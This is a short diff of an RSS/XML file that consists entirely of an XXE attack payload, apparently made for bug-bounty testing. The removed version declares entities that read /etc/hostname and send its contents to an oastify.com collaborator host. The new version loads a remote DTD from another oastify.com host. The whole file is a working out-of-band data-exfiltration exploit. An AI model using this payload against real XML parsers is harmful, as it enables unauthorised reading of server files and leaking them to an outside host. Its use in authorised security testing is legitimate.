@@ -1,16 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
+<!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://qysva1363a43dndvjimaswklhcn3bxzm.oastify.com/?data=%file;'>">
-  %eval;
-  %error;
+  <!ENTITY % remote SYSTEM "http://5nsaygrlrpsi121a7xapgb805rbizbn0.oastify.com/">
+  %remote;
 ]>
 <rss version="2.0">
   <channel>
-    <title> Security Research</title>
+    <title>Apple Bug Bounty Test</title>
     <item>
-      <title>Episode 1</title>
-      <description>Testing Parser</description>
+      <title>Testing</title>
     </item>
   </channel>
 </rss>
